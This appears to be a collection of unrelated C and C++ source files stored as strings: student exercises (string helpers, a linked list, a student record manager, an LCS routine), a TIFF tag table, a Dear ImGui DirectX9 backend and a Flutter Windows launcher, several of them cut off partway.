    "#ifndef _MAIN\r\n#define _MAIN\r\n\r\n#include <iostream>\r\n#include \"biblioteca/funciones/strings.hpp\"\r\n#include \"biblioteca/funciones/tokens.hpp\"\r\n#include \"biblioteca/funciones/files.hpp\"\r\n#include \"biblioteca/tads/parte2/Array.hpp\"\r\n#include \"biblioteca/tads/parte2/Map.hpp\"\r\n#include \"biblioteca/tads/parte2/List.hpp\"\r\n#include \"biblioteca/tads/parte2/Stack.hpp\"\r\n#include \"biblioteca/tads/parte2/Queue.hpp\"\r\n#include \"biblioteca/tads/parte1/Coll.hpp\"\r\n#include \"biblioteca/tads/parte1/MultidimColl.hpp\"\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n   /*\r\n      cout<< length(\"Pirulito\")<<endl;\r\n      tutorial  1+i\r\n      cout<< charCount(\"Apap.ku 6apa\", 'x');\r\n\r\n      string s=\"patata en casa en arg\";\r\n\r\n      cout<< substring(s,2,length(s))<<endl;\r\n      //cout<< substring(s,5)<<endl;\r\n\r\n      int p = indexOf(s,'c');\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,'a',5);\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"en\");\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"ta\",3);\r\n      cout << p << endl;\r\n\r\n      int p = lastIndexOf(s,'e');\r\n      cout << p << endl;\r\n\r\n      char palabrita='D';\r\n        int valor= charToInt(palabrita);\r\n        cout << valor << endl;\r\n\r\n      int numerito=65;\r\n      char letrita= intToChar(numerito);\r\n      cout << letrita << endl;\r\n\r\n      int numerote=4587412;\r\n      int posicion=0;\r\n      int digito= getDigit(numerote,posicion);\r\n      cout<< digito<<endl;\r\n\r\n      int digitocontador= digitCount(numerote);\r\n      cout<< digitocontador<<endl;\r\n\r\n      int numero=123;\r\n      string resultado = intToString(numero);\r\n      cout<<resultado<<endl;\r\n\r\n      int b=16;\r\n      string cadenaStringtoInt =\"12AB\"; //Ingresar binarios decimal o hexa\r\n      int iStringtoint= stringToInt(cadenaStringtoInt,b);\r\n      cout<<iStringtoint<<endl;\r\n\r\n      string ssobrecar=\"12323\";\r\n      int istringtoubtsobre= stringToInt(ssobrecar);\r\n      cout<<istringtoubtsobre<<endl;\r\n\r\n      char cchartistring = ' ';\r\n      string sChartostring = charToString(cchartistring);\r\n      cout << sChartostring << endl; // muestra: A\r\n      cout << length(sChartostring) << endl; // muestra: 1\r\n        return 0;\r\n\r\n      string sStringtochar = \" \";\r\n      char cstringtochar = stringToChar(sStringtochar);\r\n      cout << cstringtochar << endl; // muestra: A\r\n      cout << (int)cstringtochar << endl; // muestra: 65\r\n\r\n      string s = \"10\";\r\n      int i = stringToInt(s,10);\r\n      cout << i << endl;\r\n      int i = stringToInt(s);\r\n      cout << i << endl;\r\n\r\n      string s = stringToString(\"Hola\");\r\n      cout << s << endl;\r\n\r\n      double d = 123.4;\r\n      string s = doubleToString(d);\r\n      cout << s << endl;\r\n\r\n      string s = \"123.4\";\r\n      double d = stringToDouble(s);\r\n      cout << d << endl;\r\n\r\n      string s = \"\";\r\n      cout << isEmpty(s) << endl;\r\n\r\n      string s1 = \"cursoDeAlgoritmos\";\r\n      string s2 = \"c\";\r\n      if( startsWith(s1,s2) )\r\n      {\r\n         cout << s2 << \" es prefijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es prefijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s1 = \"curso de patatas\";\r\n      string s2 = \"patatas\";\r\n      if( endsWith(s1,s2) )\r\n      {\r\n      cout << s2 << \" es sufijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es sufijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s = \"abcd\";\r\n      char c = 'a';\r\n      if( contains(s,c) )\r\n      {\r\n         cout << s << \" contiene a: \" << c << endl;\r\n      }\r\n      else\r\n      {\r\n         cout << s << \" NO contiene a: \" << c << endl;\r\n      }\r\n\r\n      string s = \"Esto es una prueba\";\r\n      string r = replace(s,'e','X');\r\n      cout << r << endl;\r\n\r\n      string s = \"Esto es una prueba\";\r\n      int pos = 4;\r\n      char c = 'X';\r\n      string r = insertAt(s,pos,c);\r\n      cout << r << endl;\r\n\r\n      int n = 5;\r\n      string r = spaces(n);\r\n      // muestra: [ ] (cinco espacios)\r\n      cout << \"[\" << r << \"]\" << endl;\r\n\r\n   char c = '3';\r\n   if( isDigit(c) )\r\n   {\r\n   cout << c << \" es digito\" << endl;\r\n   }\r\n   else\r\n   {\r\n   cout << c << \" NO es digito\" << endl;\r\n   }\r\n\r\n   char c = 'X';\r\n   if( isLetter(c) )\r\n   {\r\n   cout << c << \" es letra\" << endl; // SALIDA\r\n   }\r\n   else\r\n   {\r\n      cout << c << \" NO es letra\" << endl;\r\n   }\r\n  }\r\n\r\n   string s1 = \"Pablo\";\r\n   string s2 = \"Queso\";\r\n   if( cmpString(s1,s2)<0 )\r\n   {\r\n   cout << s1 << \" es menor que: \" << s2 << endl;\r\n   }\r\n   else if(cmpString(s1,s2)>0){\r\n   cout << s1 << \" es mayor que: \" << s2 << endl;\r\n   }\r\n   else{\r\n   cout << s1 << \" es igual que: \" << s2 << endl;\r\n   }\r\n\r\n   double x = 25.7;\r\n   double y = 36.9;\r\n   if( cmpDouble(x,y)<0 )\r\n   {\r\n   cout << x << \" es menor que: \" << y << endl;\r\n   }\r\n   else if(cmpDouble(x,y)>0){\r\n      cout << x << \" es mayor que: \" << y << endl;\r\n      }\r\n   else{\r\n      cout << x << \" es igual que: \" << y << endl;\r\n     }\r\n\r\n   char c = 'n';\r\n   char r = toUpperCase(c);\r\n   cout << r << endl;\r\n   }\r\n\r\n   char c = 'n';\r\n   char r = toLowerCase(c);\r\n   cout << r << endl;\r\n\r\n   string s = \"",
    "\ufeff#include \"tiffhdr.hpp\"\n\n#include <sstream>\n#include <algorithm>\n#include <cstring>\n#include <cinttypes>\n\n// #define DEBUG_TIFFHeader 1\n\nnamespace UniformBitmap\n{\n\tconstexpr std::pair<const char*, uint16_t> IFDTagData[] =\n\t{\n\t\t{\"InteropIndex\", 0x0001},\n\t\t{\"InteropVersion\", 0x0002},\n\t\t{\"ProcessingSoftware\", 0x000b},\n\t\t{\"SubfileType\", 0x00fe},\n\t\t{\"OldSubfileType\", 0x00ff},\n\t\t{\"ImageWidth\", 0x0100},\n\t\t{\"ImageHeight\", 0x0101},\n\t\t{\"BitsPerSample\", 0x0102},\n\t\t{\"Compression\", 0x0103},\n\t\t{\"PhotometricInterpretation\", 0x0106},\n\t\t{\"Thresholding\", 0x0107},\n\t\t{\"CellWidth\", 0x0108},\n\t\t{\"CellLength\", 0x0109},\n\t\t{\"FillOrder\", 0x010a},\n\t\t{\"DocumentName\", 0x010d},\n\t\t{\"ImageDescription\", 0x010e},\n\t\t{\"Make\", 0x010f},\n\t\t{\"Model\", 0x0110},\n\t\t{\"JpgFromRawStart\", 0x0111},\n\t\t{\"OtherImageStart\", 0x0111},\n\t\t{\"StripOffsets\", 0x0111},\n\t\t{\"PreviewImageStart\", 0x0111},\n\t\t{\"StripOffsets\", 0x0111},\n\t\t{\"Orientation\", 0x0112},\n\t\t{\"SamplesPerPixel\", 0x0115},\n\t\t{\"RowsPerStrip\", 0x0116},\n\t\t{\"JpgFromRawLength\", 0x0117},\n\t\t{\"PreviewImageLength\", 0x0117},\n\t\t{\"StripByteCounts\", 0x0117},\n\t\t{\"OtherImageLength\", 0x0117},\n\t\t{\"MinSampleValue\", 0x0118},\n\t\t{\"MaxSampleValue\", 0x0119},\n\t\t{\"XResolution\", 0x011a},\n\t\t{\"YResolution\", 0x011b},\n\t\t{\"PlanarConfiguration\", 0x011c},\n\t\t{\"PageName\", 0x011d},\n\t\t{\"XPosition\", 0x011e},\n\t\t{\"YPosition\", 0x011f},\n\t\t{\"FreeOffsets\", 0x0120},\n\t\t{\"FreeByteCounts\", 0x0121},\n\t\t{\"GrayResponseUnit\", 0x0122},\n\t\t{\"GrayResponseCurve\", 0x0123},\n\t\t{\"T4Options\", 0x0124},\n\t\t{\"T6Options\", 0x0125},\n\t\t{\"ResolutionUnit\", 0x0128},\n\t\t{\"PageNumber\", 0x0129},\n\t\t{\"ColorResponseUnit\", 0x012c},\n\t\t{\"TransferFunction\", 0x012d},\n\t\t{\"Software\", 0x0131},\n\t\t{\"ModifyDate\", 0x0132},\n\t\t{\"Artist\", 0x013b},\n\t\t{\"HostComputer\", 0x013c},\n\t\t{\"Predictor\", 0x013d},\n\t\t{\"WhitePoint\", 0x013e},\n\t\t{\"PrimaryChromaticities\", 0x013f},\n\t\t{\"ColorMap\", 0x0140},\n\t\t{\"HalftoneHints\", 0x0141},\n\t\t{\"TileWidth\", 0x0142},\n\t\t{\"TileLength\", 0x0143},\n\t\t{\"TileOffsets\", 0x0144},\n\t\t{\"TileByteCounts\", 0x0145},\n\t\t{\"BadFaxLines\", 0x0146},\n\t\t{\"CleanFaxData\", 0x0147},\n\t\t{\"ConsecutiveBadFaxLines\", 0x0148},\n\t\t{\"SubIFD\", 0x014a},\n\t\t{\"A100DataOffset\", 0x014a},\n\t\t{\"InkSet\", 0x014c},\n\t\t{\"InkNames\", 0x014d},\n\t\t{\"NumberofInks\", 0x014e},\n\t\t{\"DotRange\", 0x0150},\n\t\t{\"TargetPrinter\", 0x0151},\n\t\t{\"ExtraSamples\", 0x0152},\n\t\t{\"SampleFormat\", 0x0153},\n\t\t{\"SMinSampleValue\", 0x0154},\n\t\t{\"SMaxSampleValue\", 0x0155},\n\t\t{\"TransferRange\", 0x0156},\n\t\t{\"ClipPath\", 0x0157},\n\t\t{\"XClipPathUnits\", 0x0158},\n\t\t{\"YClipPathUnits\", 0x0159},\n\t\t{\"Indexed\", 0x015a},\n\t\t{\"JPEGTables\", 0x015b},\n\t\t{\"OPIProxy\", 0x015f},\n\t\t{\"GlobalParametersIFD\", 0x0190},\n\t\t{\"ProfileType\", 0x0191},\n\t\t{\"FaxProfile\", 0x0192},\n\t\t{\"CodingMethods\", 0x0193},\n\t\t{\"VersionYear\", 0x0194},\n\t\t{\"ModeNumber\", 0x0195},\n\t\t{\"Decode\", 0x01b1},\n\t\t{\"DefaultImageColor\", 0x01b2},\n\t\t{\"T82Options\", 0x01b3},\n\t\t{\"JPEGTables\", 0x01b5},\n\t\t{\"JPEGProc\", 0x0200},\n\t\t{\"JpgFromRawStart\", 0x0201},\n\t\t{\"OtherImageStart\", 0x0201},\n\t\t{\"PreviewImageStart\", 0x0201},\n\t\t{\"ThumbnailOffset\", 0x0201},\n\t\t{\"ThumbnailLength\", 0x0202},\n\t\t{\"JpgFromRawLength\", 0x0202},\n\t\t{\"PreviewImageLength\", 0x0202},\n\t\t{\"ThumbnailLength\", 0x0202},\n\t\t{\"OtherImageLength\", 0x0202},\n\t\t{\"JPEGRestartInterval\", 0x0203},\n\t\t{\"JPEGLosslessPredictors\", 0x0205},\n\t\t{\"JPEGPointTransforms\", 0x0206},\n\t\t{\"JPEGQTables\", 0x0207},\n\t\t{\"JPEGDCTables\", 0x0208},\n\t\t{\"JPEGACTables\", 0x0209},\n\t\t{\"YCbCrCoefficients\", 0x0211},\n\t\t{\"YCbCrSubSampling\", 0x0212},\n\t\t{\"YCbCrPositioning\", 0x0213},\n\t\t{\"ReferenceBlackWhite\", 0x0214},\n\t\t{\"StripRowCounts\", 0x022f},\n\t\t{\"ApplicationNotes\", 0x02bc},\n\t\t{\"USPTOMiscellaneous\", 0x03e7},\n\t\t{\"RelatedImageFileFormat\", 0x1000},\n\t\t{\"RelatedImageWidth\", 0x1001},\n\t\t{\"RelatedImageHeight\", 0x1002},\n\t\t{\"Rating\", 0x4746},\n\t\t{\"XP_DIP_XML\", 0x4747},\n\t\t{\"StitchInfo\", 0x4748},\n\t\t{\"RatingPercent\", 0x4749},\n\t\t{\"SonyRawFileType\", 0x7000},\n\t\t{\"SonyToneCurve\", 0x7010},\n\t\t{\"VignettingCorrection\", 0x7031},\n\t\t{\"VignettingCorrParams\", 0x7032},\n\t\t{\"ChromaticAberrationCorrection\", 0x7034},\n\t\t{\"ChromaticAberrationCorrParams\", 0x7035},\n\t\t{\"DistortionCorrection\", 0x7036},\n\t\t{\"DistortionCorrParams\", 0x7037},\n\t\t{\"SonyRawImageSize\", 0x7038},\n\t\t{\"BlackLevel\", 0x7310},\n\t\t{\"WB_RGGBLevels\", 0x7313},\n\t\t{\"SonyCropTopLeft\", 0x74c7},\n\t\t{\"SonyCropSize\", 0x74c8},\n\t\t{\"ImageID\", 0x800d},\n\t\t{\"WangTag1\", 0x80a3},\n\t\t{\"WangAnnotation\", 0x80a4},\n\t\t{\"WangTag3\", 0x80a5},\n\t\t{\"WangTag4\", 0x80a6},\n\t\t{\"ImageReferencePoints\", 0x80b9},\n\t\t{\"RegionXformTackPoint\", 0x80ba},\n\t\t{\"WarpQuadrilateral\", 0x80bb},\n\t\t{\"AffineTransformMat\", 0x80bc},\n\t\t{\"Matteing\", 0x80e3},\n\t\t{\"DataType\", 0x80e4},\n\t\t{\"ImageDepth\", 0x80e5},\n\t\t{\"TileDepth\", 0x80e6},\n\t\t{\"ImageFullWidth\", 0x8214},\n\t\t{\"ImageFullHeight\", 0x8215},\n\t\t{\"TextureFormat\", 0x8216},\n\t\t{\"WrapModes\", 0x8217},\n\t\t{\"FovCot\", 0x8218},\n\t\t{\"MatrixWorldToScreen\", 0x8219},\n\t\t{\"MatrixWorldToCamera\", 0x821a},\n\t\t{\"Model2\", 0x827d},\n\t\t{\"CFARepeatPatternDim\", 0x828d},\n\t\t{\"CFAPattern2\", 0x828e},\n\t\t{\"BatteryLevel\", 0x828f},\n\t\t{\"KodakIFD\", 0x8290},\n\t\t{\"Copyright\", 0x8298},\n\t\t{\"ExposureTime\", 0x829a},\n\t\t{\"FNumber\", 0x829d},\n\t\t{\"MDFileTag\", 0x82a5},\n\t\t{",
    "// dear imgui: Renderer Backend for DirectX9\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'LPDIRECT3DTEXTURE9' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: DirectX9: Explicitly disable texture state stages after >= 1.\n//  2021-05-19: DirectX9: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-23: DirectX9: Explicitly setting up more graphics states to increase compatibility with unusual non-default states.\n//  2021-03-18: DirectX9: Calling IDirect3DStateBlock9::Capture() after CreateStateBlock() as a workaround for state restoring issues (see #3857).\n//  2021-03-03: DirectX9: Added support for IMGUI_USE_BGRA_PACKED_COLOR in user's imconfig file.\n//  2021-02-18: DirectX9: Change blending equation to preserve alpha in output buffer.\n//  2019-05-29: DirectX9: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX9: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2019-03-29: Misc: Fixed erroneous assert in ImGui_ImplDX9_InvalidateDeviceObjects().\n//  2019-01-16: Misc: Disabled fog before drawing UI's. Fixes issue #2288.\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-06-08: Misc: Extracted imgui_impl_dx9.cpp/.h away from the old combined DX9+Win32 example.\n//  2018-06-08: DirectX9: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-05-07: Render: Saving/restoring Transform because they don't seem to be included in the StateBlock. Setting shading mode to Gouraud.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX9_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n\n#include \"imgui.h\"\n#include \"imgui_impl_dx9.h\"\n\n// DirectX\n#include <d3d9.h>\n\n// DirectX data\nstruct ImGui_ImplDX9_Data\n{\n    LPDIRECT3DDEVICE9           pd3dDevice;\n    LPDIRECT3DVERTEXBUFFER9     pVB;\n    LPDIRECT3DINDEXBUFFER9      pIB;\n    LPDIRECT3DTEXTURE9          FontTexture;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX9_Data()        { memset((void*)this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct CUSTOMVERTEX\n{\n    float    pos[3];\n    D3DCOLOR col;\n    float    uv[2];\n};\n#define D3DFVF_CUSTOMVERTEX (D3DFVF_XYZ|D3DFVF_DIFFUSE|D3DFVF_TEX1)\n\n#ifdef IMGUI_USE_BGRA_PACKED_COLOR\n#define IMGUI_COL_TO_DX9_ARGB(_COL)     (_COL)\n#else\n#define IMGUI_COL_TO_DX9_ARGB(_COL)     (((_COL) & 0xFF00FF00) | (((_COL) & 0xFF0000) >> 16) | (((_COL) & 0xFF) << 16))\n#endif\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX9_Data* ImGui_ImplDX9_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX9_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nstatic void ImGui_ImplDX9_SetupRenderState(ImDrawData* draw_data)\n{\n    ImGui_ImplDX9_Data* bd = ImGui_ImplDX9_GetBackendData();\n\n    // Setup viewport\n    D3DVIEWPORT9 vp;\n    vp.X = vp.Y = 0;\n    vp.Width = (DWORD)draw_data->DisplaySize.x;\n    vp.Height = (DWORD)draw_data->DisplaySize.y;\n    vp.MinZ = 0.0f;\n    vp.MaxZ = 1.0f;\n    bd->pd3dDevice->SetViewport(&vp);\n\n    // Setup render state: fixed-pipeline, alpha-blending, no face culling, no depth testing, shade mode (for gradient), bilinear sampling.\n    bd->pd3dDevice->SetPixelShader(nullptr);\n    bd->pd3dDevice->SetVertexShader(nullptr);\n    bd->pd3dDevice->SetRenderState(D3DRS_FILLMODE, D3DFILL_SOLID);\n    bd->pd3dDevice->SetRenderState(D3DRS_SHADEMODE,",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint data;\n\tnode* next;\n};\n\nnode* head = NULL;\nnode* current = NULL;\nnode* tail = NULL;\n\nvoid insert(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\ttail->next = current;\n\t\ttail = tail->next;\n\t}\n}\nvoid AddToHead(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->next = head;\n\t\thead = current;\n\t}\n}\nvoid deleteNode(int Deldata) {\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tif (current->data == Deldata)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (current != NULL)\n\t\t\t{\n\t\t\t\tif ((current->next)->data == Deldata)\n\t\t\t\t{\n\t\t\t\t\t(current->next) = (current->next)->next;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse { current = current->next; }\n\t\t\t}\n\t\t}\n\t}\n\telse { cout << \"No Data Found\" << endl; }\n}\nvoid destoryList()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t\tcurrent = head;\n\t\t}\n\t\thead = NULL;\n\t\ttail = NULL;\n\t\tcout << \"The list is Destroyed Successfully\" << endl;\n\t}\n\telse\n\t{ cout << \"There is no list to be destroyed\" << endl; }\n}\nvoid display()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tcout << \"Data:\" << endl;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse\n\t{ cout << \"No Data Found\" << endl; }\n}\n\nvoid app() {\n\t/*\n\t\top -> operation\n\t\tath -> add to head\n\t\tdn -> deleted node\n\t\tc -> confirm\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, ath, dn, c, ao, s;\n\n\tcout << \"--- Welcome to linked list implementation---\\n\";\n\tdo {\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Add to head -> (1)\\n\";\n\t\tcout << \"Delete node -> (2)\\n\";\n\t\tcout << \"Display -> (3)\\n\";\n\t\tcout << \"Destory list -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tif (op == 1) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ath;\n\t\t\tAddToHead(ath);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 2) {\n\t\t\tdisplay();\n\t\t\tcout << \"Choise the node \\n\";\n\t\t\tcin >> dn;\n\t\t\tcout << \"Are you sure to delete this node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdeleteNode(dn);\n\t\t\t\tcout << \"\\nCheck data of list after deleting node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Delete is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 3) {\n\t\t\tcout << \"\\nThe Nodes of the Linked List are: \\n\";\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 4) {\n\t\t\tdisplay();\n\t\t\tcout << \"\\nIF Destroyed the whole list\\n \\t The result will be: \\n\";\n\t\t\tcout << \"Are you sure to destroy the whole list\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdestoryList();\n\t\t\t\tcout << \"\\nCheck data of list after destroying : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Destroy is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 5)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\telse { cout << \"Error in entry\\n\"; }\n\n\t\tcout << \"\\n\";\n\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include<iostream>\n#include<fstream>\n#include<iomanip>\nusing namespace std;\nvoid addstudent()\n{\nofstream f;\nf.open(\"Studentinfo.txt\",ios::app);\nstring name,div,add;\nstring roll;\ncout<<\"Enter student Roll number :\";\ncin>>roll;\ncout<<\"Enter student Name :\";\ncin>>name;\ncout<<\"Enter student Division :\";\ncin>>div;\ncout<<\"Enter student Address :\";\ncin>>add;\nf<<left<<setw(20)<<roll<<setw(20)<<name<<setw(20)<<div<<setw(20)<<add<<endl;\ncout<<\"\\nStudent details added succesfully !!\";\nf.close();\n}\nvoid deletestudent()\n{\nifstream f;\nf.open(\"Studentinfo.txt\",ios::app);\nstring line;\nstring fdata;\ncout<<\"Enter the roll number to Delete :\";\nstring roll;\ncin>>roll;\nwhile(getline(f,line)){\nif(line.find(roll) == string::npos){\nfdata+=line;\nfdata+=\"\\n\";\n}\n}\nf.close();\nofstream f1;\nf1.open(\"Studentinfo.txt\",ios::out);\nf1<<fdata;\nf1.close();\ncout<<\"\\nStudent deleted successfully !!\";\n}\nvoid searchstudent()\n{\nifstream f;\nf.open(\"Studentinfo.txt\",ios::app);\nstring line;\ncout<<\"Enter the roll number to search :\";\nstring roll;\ncin>>roll;\nbool found = false;\nwhile(getline(f,line)){\nif(line.find(roll)!= string::npos){\ncout<<\"Student Found\\n\";\ncout<<\"Student details\\n\";\ncout<<line<<endl;\nfound=true;\n}\n}\nf.close();\nif(!found){\ncout<<\"\\nStudent not found !!\";\n}\n}\nvoid printdata()\n{\nifstream f;\nstring line;\nf.open(\"Studentinfo.txt\",ios::app);\ncout<<\"\\n---------Printing details of the students----------\"<<endl;\nwhile(getline(f,line)){\ncout<<line<<endl;\n}\ncout<<\"\\n---------------Printing completed---------------\"<<endl;\nf.close();\n}\nint main()\n{\nofstream f;\nf.open(\"Studentinfo.txt\",ios::out);\nf<<left<<setw(20)<<\"Roll Number\"<<setw(20)<<\"Name\"<<setw(20)<<\"Dvision\"<<setw(20)<<\"Address\"<<endl;\nf.close();\nint ch;\nwhile(ch !=-1){\ncout<<\"\\n----------------------------\";\ncout<<\"\\nEnter your choice :\\n1)Add student \\n2)Delete student \\n3)Search student \\n4)Print data \\n5)Exit(-1)\\n---------------------------->\";\ncin>>ch;\nswitch(ch){\ncase 1:\naddstudent();\nbreak;\ncase 2:\ndeletestudent();\nbreak;\ncase 3:\nsearchstudent();\nbreak;\ncase 4:\nprintdata();\nbreak;\n}\n}\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"screen_casting_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<stdio.h>\r\n#include<string.h>\r\n\r\n#define MAX 100\r\n\r\nchar a[MAX],b[MAX];\t//\u5b58\u50a8\u5b57\u7b26\u4e32 \r\nchar maxstr[MAX][MAX];\t//\u4e8c\u7ef4\u6570\u7ec4\u5b58\u50a8\u6700\u957f\u516c\u5171\u5b50\u5e8f\u5217\uff08\u53ef\u80fd\u957f\u5ea6\u76f8\u540c\u4f46\u5e8f\u5217\u4e0d\u540c\uff09 \r\nchar LCS[MAX];\t//\u5b58\u50a8\u5f53\u524d\u6240\u67e5\u8be2\u7684\u516c\u5171\u5b50\u5e8f\u5217 \r\nint len_a,len_b,maxlen=0,maxstrCount=0;\t//\u4e24\u4e2a\u5b57\u7b26\u4e32\u957f\u5ea6\uff1b\u6700\u957f\u516c\u5171\u5b50\u5e8f\u5217\u957f\u5ea6\uff1b\u6700\u957f\u516c\u5171\u5b50\u5e8f\u5217\u7684\u4e2a\u6570 \r\n\r\nvoid MAXLEN(int pos_a,int pos_b,int len,char LCS[MAX]) {\r\n\tif(pos_a>=len_a || pos_b>=len_b) {\t//\u8d85\u51fa\u6570\u7ec4\u957f\u5ea6 \r\n\t\tif(len>maxlen) {\t//\u82e5\u76ee\u524d\u5b57\u7b26\u4e32\u957f\u5ea6\u5927\u4e8e\u5df2\u77e5\u6700\u957f\u5b57\u7b26\u4e32\uff0c\u5219\u8fdb\u884c\u8bb0\u5f55\u66f4\u65b0 \r\n\t\t\tmaxlen=len;\r\n\t\t\tmaxstrCount=0;\r\n\t\t\tLCS[len + 1] = '\\0'; //\u5728\u7ed3\u5c3e\u6dfb\u52a0\u7a7a\u5b57\u7b26\r\n\t\t\tstrcpy(maxstr[maxstrCount],LCS);\t//\u5c06\u76ee\u524d\u5b57\u7b26\u4e32\u5b58\u5165\u7528\u4e8e\u5b58\u50a8\u6700\u957f\u5b57\u7b26\u4e32\u7684\u6570\u7ec4\u4e2d \r\n\t\t\tmaxstrCount++;\r\n\t\t}\r\n\t\telse if(len==maxlen) 